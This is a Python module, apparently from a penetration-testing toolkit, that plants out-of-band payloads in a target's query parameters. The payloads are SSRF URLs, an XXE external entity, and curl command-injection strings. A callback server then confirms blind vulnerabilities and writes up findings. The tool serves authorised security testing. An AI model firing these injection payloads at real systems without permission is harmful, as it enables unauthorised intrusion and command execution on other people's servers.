"""omega/offensive/offense/blindrelay — blind attack relay via OOB.

Takes the blind classes (SSRF/XXE/SSTI-blind/cmd-blind) and gives
every payload a unique OOB token URL from omega.core.oob. A callback
hit CONFIRMS the blind vulnerability (per-token, unguessable) —
this is the one place candidate becomes confirmed without operator
replay, because the target itself proved it fetched our URL.
OFFENSE-GATED (PTK_OFFENSE).
"""
import os

__all__ = ["run_blindrelay"]

BLIND_SHAPES = [
    ("ssrf-url", "url", "http://{token}/probe"),
    ("ssrf-file", "file", "http://{token}/probe"),
    ("ssrf-callback", "callback", "http://{token}/probe"),
    ("xxe-entity", "xml",
     '<!DOCTYPE x [<!ENTITY % p SYSTEM "http://{token}/probe"> %p;]>'),
    ("cmd-oob", "cmd", "curl http://{token}/probe"),
    ("cmd-oob2", "host", "`curl http://{token}/probe`"),
]


def run_blindrelay(target, fetch, log=None, gate_open_fn=None,
                   wait_s=5.0):
    """Plant token URLs in blind payload shapes and wait for callbacks."""
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    if not callable(fetch):
        return {"note": "fetch adapter required"}
    try:
        from omega.core.oob import OOBCallbackServer
    except ImportError:
        return {"note": "omega.core.oob not available"}
    findings = []
    probes = 0
    confirmed = 0
    try:
        with OOBCallbackServer() as srv:
            planted = []
            for name, param, tpl in BLIND_SHAPES:
                token_url = srv.token_url()
                token = token_url.rsplit("/", 1)[-1]
                value = tpl.replace("{token}", token_url)
                sep = "&" if "?" in str(target) else "?"
                try:
                    fetch(str(target) + sep + param + "=" + value)
                    probes += 1
                except Exception:
                    continue
                planted.append((name, param, token, value))
            # wait once for any callback across planted tokens
            hit = None
            for name, param, token, value in planted:
                h = srv.wait_for_hit(token, timeout_s=wait_s)
                if h:
                    hit = (name, param, token, value, h)
                    break
            if hit:
                name, param, token, value, h = hit
                confirmed = 1
                findings.append({
                    "title": f"blind {name} CONFIRMED by out-of-band "
                             f"callback (param {param})",
                    "severity": "CRITICAL" if "cmd" in name else "HIGH",
                    "source": "blindrelay/oob-confirmed",
                    "evidence": f"target fetched the unique token URL "
                                f"(token {token[:8]}..., hit from "
                                f"{h.get('remote') if isinstance(h, dict) else 'oob'})",
                    "location": str(target),
                    "verification": "confirmed",
                    "manual_check": "callback provenance is the target "
                                    "itself — include the OOB log entry "
                                    "in the report",
                    "cwe": {"ssrf": "CWE-918", "xxe": "CWE-611",
                            "cmd": "CWE-78"}.get(
                                name.split("-")[0], "CWE-918"),
                })
    except Exception as exc:
        return {"note": f"blindrelay error: {exc}"}
    if log:
        log(f"blindrelay: probes={probes} confirmed={confirmed}")
    return {"findings": findings, "probes": probes,
            "confirmed": confirmed}
